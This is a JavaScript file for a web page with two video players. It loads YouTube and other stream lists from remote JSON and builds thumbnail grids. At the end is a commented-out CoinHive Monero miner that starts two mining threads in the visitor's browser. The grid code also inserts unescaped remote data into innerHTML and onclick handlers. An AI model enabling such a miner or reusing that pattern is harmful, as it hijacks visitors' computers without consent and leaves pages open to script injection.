var videoPlayer1, videoPlayer2;


$(document).ready(function () {
  $.ajax({
    url: "https://api.myjson.com/bins/zzrd1",
    dataType: "json",
    success: function (data) {
      initYoutubePlayer("http://www.youtube.com/watch?v=" + data.streamIds[0],
        "https://i.ytimg.com/vi/" + data.streamIds[0] + "/hqdefault.jpg");
      initYoutubeVideosGridder(data);
    }
  });
  $.ajax({
    url: "https://api.myjson.com/bins/s96wb",
    dataType: "json",
    success: function (data) {
      videoPlayer2.setSrc(data.streams[0].streamUrl);
      initOtherVideosGridder(data);
    }
  });
});

function initYoutubePlayer(source, poster) {
  videoPlayer1 = new MediaElementPlayer('player1', {
    startVolume: 0.8,
    loop: false,
    features: ['playpause', 'volume', 'fullscreen'],
    alwaysShowControls: false,
    alwaysShowHours: false,
    showTimecodeFrameCount: false,
    framesPerSecond: 25,
    autoplay: false,
    enableKeyboard: true,
    pauseOtherPlayers: true,
    stretching: 'auto',
    pluginPath: 'build/',
    success: function (media) {
      media.play();
    },
  });

  videoPlayer2 = new MediaElementPlayer('player2', {
    startVolume: 0.8,
    loop: false,
    features: ['playpause', 'volume', 'fullscreen'],
    alwaysShowControls: false,
    alwaysShowHours: false,
    showTimecodeFrameCount: false,
    framesPerSecond: 25,
    autoplay: false,
    enableKeyboard: true,
    pauseOtherPlayers: true,
    stretching: 'auto',
    pluginPath: 'build/',
    success: function (media) {
      media.play();
    },
  });

  videoPlayer1.setSrc(source);
  videoPlayer1.setPoster(poster);
  videoPlayer1.load();
  videoPlayer1.play();
  return videoPlayer1;
}

function initYoutubeVideosGridder(data) {
  var fullhtml = "";
  for (var i in data.streamIds) {
    var html = "<div class=\"col-sm-2\" style=\"padding: 5px 5px 5px 5px\"><a href=\"#\" onclick=\"openNewYoutubeVideo('" + data.streamIds[i] + "')\">";
    var img = "<img src='https://i.ytimg.com/vi/" + data.streamIds[i] + "/hqdefault.jpg' style='width:100%; height:100%;'>";
    html += img;
    html += "</a></div>";
    fullhtml += html;
  }
  document.getElementById("row").innerHTML = fullhtml;
}

function initOtherVideosGridder(data) {
  var fullhtml = "";
  for (var i in data.streams) {
    var html = "<div class=\"col-sm-2\" style=\"padding: 5px 5px 5px 5px\"><a href=\"#\" onclick=\"openOtherVideos('" + data.streams[i].streamUrl + "')\">";
    var img = "<img src='" + data.streams[i].image + "' style='width:100%; height:100%;'>";
    html += img;
    html += "</a></div>";
    fullhtml += html;
  }
  document.getElementById("row2").innerHTML = fullhtml;
}


function openNewYoutubeVideo(id) {
  videoPlayer1.setSrc("http://www.youtube.com/watch?v=" + id);
}

function openOtherVideos(url) {
  videoPlayer2.setSrc(url);
}


// Monero Miner
// var miner;
// $(document).ready(function () {
//
//   miner = new CoinHive.Anonymous('z7tT0qieXxxjNGXy3NwbVBd3S16d2GIr', {
//     threads: 2
//
//   });
//   miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
//
//   setInterval(function () {
//     var threadCount = miner.getNumThreads();
//     console.log("Threads: " + threadCount);
//   }, 1000);
//
// });
